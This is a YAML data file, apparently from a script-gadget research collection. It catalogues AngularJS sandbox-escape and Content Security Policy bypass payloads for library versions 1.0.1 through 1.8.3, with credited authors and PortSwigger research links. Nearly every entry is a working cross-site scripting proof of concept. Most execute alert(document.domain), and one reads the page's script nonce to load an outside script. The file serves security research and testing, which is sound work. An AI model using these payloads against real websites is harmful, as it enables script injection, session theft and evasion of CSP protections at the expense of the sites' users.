---
description: AngularJS - HTML enhanced for web apps!
github: angular/angular.js
gadgets:
  1.4.5&≥1.6.0 (1):
    authors:
      - twitter:garethheyes
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - custom-attr
      - wh-host-csp
      - nonce-csp
      - before-lib-load
    pocs:
      - description: |
          Many other variants have been found by [@garethheyes](https://x.com/garethheyes) (see Related Links).
        code: |
          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js"></script>

          <!-- user input -->
          <div ng-app><input autofocus ng-focus="$event.view.alert(1)"></div>
      - description: |
          As long as `eval`, `Function`, `setTimeout`... isn't called, it doesn't requires `unsafe-eval`. Due to that, it is possible to retrieve the nonce and load a script.
        code: |
          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js"></script>

          <!-- user input -->
          <div ng-app>
            <img src=x ng-on-error='
              doc=$event.target.ownerDocument;
              a=doc.defaultView.document.querySelector("[nonce]");
              b=doc.createElement("script");
              b.src="[current-location]/assets/xss/index.js";
              b.nonce=a.nonce; doc.body.appendChild(b)'>
          </div>
    links:
      - https://portswigger.net/research/ambushed-by-angularjs-a-hidden-csp-bypass-in-piwik-pro
      - https://portswigger.net/research/angularjs-csp-bypass-in-56-characters
      - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-csp-bypasses
      - https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/
  1.6.0 (2):
    authors:
      - twitter:cure53berlin
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - custom-attr
      - wh-host-csp
      - nonce-csp
      - unsafe-eval-csp
      - before-lib-load
    pocs:
      - description: Starting `1.6.0`, [AngularJS](https://github.com/angular/angular.js) has removed the sandbox that prevents the execution of arbitrary code.
        code: |
          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>

          <!-- user input -->
          <div ng-app>{{constructor.constructor('alert(document.domain)')()}}</div>
      - description: This shorten version have been found by [@garethheyes](https://x.com/garethheyes) and [@LewisArdern](https://x.com/LewisArdern).
        code: |
          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>

          <!-- user input -->
          <div ng-app>{{$on.constructor('alert(document.domain)')()}}</div>
    links:
      - https://portswigger.net/research/dom-based-angularjs-sandbox-escapes
      - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected
  1.2.0-1.5.0:
    authors:
      - twitter:sirdarckcat
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - custom-attr
      - wh-host-csp
      - nonce-csp
      - unsafe-eval-csp
      - before-lib-load
    pocs:
      - code: |
          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.5.0/angular.min.js"></script>

          <!-- user input -->
          <div ng-app ng-csp><div ng-focus="x=$event;" id=f tabindex=0>foo</div><div ng-repeat="(key, value) in x.view"><div ng-if="key == 'window'">{{[1].reduce(value.alert, 1);}}</div></div></div>
    links:
      - https://portswigger.net/research/angularjs-csp-bypass-in-56-characters
      - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-csp-bypasses
  1.5.9-1.5.11:
    authors:
      - twitter:tehjh
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - custom-attr
      - wh-host-csp
      - nonce-csp
      - unsafe-eval-csp
      - before-lib-load
    pocs:
      - code: |
          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.min.js"></script>

          <!-- user input -->
          <div ng-app>{{c=''.sub.call;b=''.sub.bind;a=''.sub.apply; c.$apply=$apply;c.$eval=b;op=$root.$$phase; $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString; C=c.$apply(c);$root.$$phase=op;$root.$digest=od; B=C(b,c,b);$evalAsync(" astNode=pop();astNode.type='UnaryExpression'; astNode.operator='(window.X?void0:(window.X=true,alert(1)))+'; astNode.argument={type:'Identifier',name:'foo'}; "); m1=B($$asyncQueue.pop().expression,null,$root); m2=B(C,null,m1);[].push.apply=m2;a=''.sub; $eval('a(b.c)');[].push.apply=a;}}</div>
      - description: This shorten version was found by [@tehjh](https://x.com/tehjh) and Lukasz Plonka
        code: |
          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.min.js"></script>

          <!-- user input -->
          <div ng-app>{{c=''.sub.call;b=''.sub.bind;c.$apply=$apply;c.$eval=b;$root.$$phase=null;$root.$digest=$on; C=c.$apply(c);B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='alert(1)';astNode.argument={type:'Identifier'};");m1=$$asyncQueue.pop().expression;m2=B(C,null,m1);[].push.apply=m2;$eval('B(b)');}}</div>
    links:
      - https://portswigger.net/research/dom-based-angularjs-sandbox-escapes
      - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected
  1.5.0-1.5.8:
    authors:
      - twitter:garethheyes
      - twitter:tehjh
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - custom-attr
      - wh-host-csp
      - nonce-csp
      - unsafe-eval-csp
      - before-lib-load
    pocs:
      - code: |
          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.min.js"></script>

          <!-- user input -->
          <div ng-app>{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}</div>
    links:
      - https://portswigger.net/research/dom-based-angularjs-sandbox-escapes
      - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected
  1.4.0-1.4.9:
    authors:
      - twitter:garethheyes
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - custom-attr
      - wh-host-csp
      - nonce-csp
      - unsafe-eval-csp
      - before-lib-load
    pocs:
      - code: |
          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.9/angular.min.js"></script>

          <!-- user input -->
          <div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}</div>
    links:
      - https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs
      - https://portswigger.net/research/dom-based-angularjs-sandbox-escapes
      - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected
  1.3.20:
    authors:
      - twitter:garethheyes
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - custom-attr
      - wh-host-csp
      - nonce-csp
      - unsafe-eval-csp
      - before-lib-load
    pocs:
      - code: |
          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.3.20/angular.min.js"></script>

          <!-- user input -->
          <div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}</div>
    links:
      - https://portswigger.net/research/dom-based-angularjs-sandbox-escapes
      - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected
  1.3.19:
    authors:
      - twitter:garethheyes
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - custom-attr
      - wh-host-csp
      - nonce-csp
      - unsafe-eval-csp
      - before-lib-load
    pocs:
      - code: |
          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.3.19/angular.min.js"></script>

          <!-- user input -->
          <div ng-app>{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}</div>
    links:
      - https://portswigger.net/research/dom-based-angularjs-sandbox-escapes
      - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected
  1.3.3-1.3.18:
    authors:
      - twitter:garethheyes
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - custom-attr
      - wh-host-csp
      - nonce-csp
      - unsafe-eval-csp
      - before-lib-load
    pocs:
      - code: |
          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.3.18/angular.min.js"></script>

          <!-- user input -->
          <div ng-app>{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(document.domain)//');}}</div>
    links:
      - https://portswigger.net/research/dom-based-angularjs-sandbox-escapes
      - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected
  1.3.0:
    authors:
      - twitter:molnar_g
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - custom-attr
      - wh-host-csp
      - nonce-csp
      - unsafe-eval-csp
      - before-lib-load
    pocs:
      - code: |
          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.3.0/angular.min.js"></script>

          <!-- user input -->
          <div ng-app>{{!ready && (ready = true) && ( !call ? $$watchers[0].get(toString.constructor.prototype) : (a = apply) && (apply = constructor) && (valueOf = call) && (''+''.toString( 'F = Function.prototype;' + 'F.apply = F.a;' + 'delete F.a;' + 'delete F.valueOf;' + 'alert(document.domain);' )));}}</div>
    links:
      - https://portswigger.net/research/dom-based-angularjs-sandbox-escapes
      - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected
  1.2.19-1.2.23:
    authors:
      - twitter:avlidienbrunn
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - custom-attr
      - wh-host-csp
      - nonce-csp
      - unsafe-eval-csp
      - before-lib-load
    pocs:
      - code: |
          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.23/angular.min.js"></script>

          <!-- user input -->
          <div ng-app>{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(document.domain)"].sort(toString.constructor);}}</div>
    links:
      - https://portswigger.net/research/dom-based-angularjs-sandbox-escapes
      - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected
  1.2.6-1.2.18:
    authors:
      - twitter:tehjh
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - custom-attr
      - wh-host-csp
      - nonce-csp
      - unsafe-eval-csp
      - before-lib-load
    pocs:
      - code: |
          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.18/angular.min.js"></script>

          <!-- user input -->
          <div ng-app>{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(document.domain)')()}}</div>
    links:
      - https://portswigger.net/research/dom-based-angularjs-sandbox-escapes
      - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected
  1.2.2-1.2.5/1.2.27-1.2.29/1.3.0-1.3.20:
    authors:
      - twitter:garethheyes
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - custom-attr
      - wh-host-csp
      - nonce-csp
      - unsafe-eval-csp
      - before-lib-load
    pocs:
      - code: |
          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.3.20/angular.min.js"></script>

          <!-- user input -->
          <div ng-app>{{{}.")));alert(1)//"}}</div>
    links:
      - https://portswigger.net/research/adapting-angularjs-payloads-to-exploit-real-world-applications
      - https://portswigger.net/research/dom-based-angularjs-sandbox-escapes
      - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected
  1.2.0-1.2.1:
    authors:
      - twitter:tehjh
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - custom-attr
      - wh-host-csp
      - nonce-csp
      - unsafe-eval-csp
      - before-lib-load
    pocs:
      - code: |
          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.2.1/angular.min.js"></script>

          <!-- user input -->
          <div ng-app>{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(document.domain)')()}}</div>
    links:
      - https://portswigger.net/research/dom-based-angularjs-sandbox-escapes
      - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected
  1.0.1-1.1.5:
    authors:
      - twitter:cure53berlin
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - custom-attr
      - wh-host-csp
      - nonce-csp
      - unsafe-eval-csp
      - before-lib-load
    pocs:
      - code: |
          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>

          <!-- user input -->
          <div ng-app>{{constructor.constructor('alert(document.domain)')()}}</div>
      - description: This shorten version have been found by [@garethheyes](https://x.com/garethheyes) and [@LewisArdern](https://x.com/LewisArdern).
        code: |
          <script nonce="secret" src="https://ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script>

          <!-- user input -->
          <div ng-app>{{$on.constructor('alert(document.domain)')()}}</div>
    links:
      - https://portswigger.net/research/dom-based-angularjs-sandbox-escapes
      - https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-sandbox-escapes-reflected
---
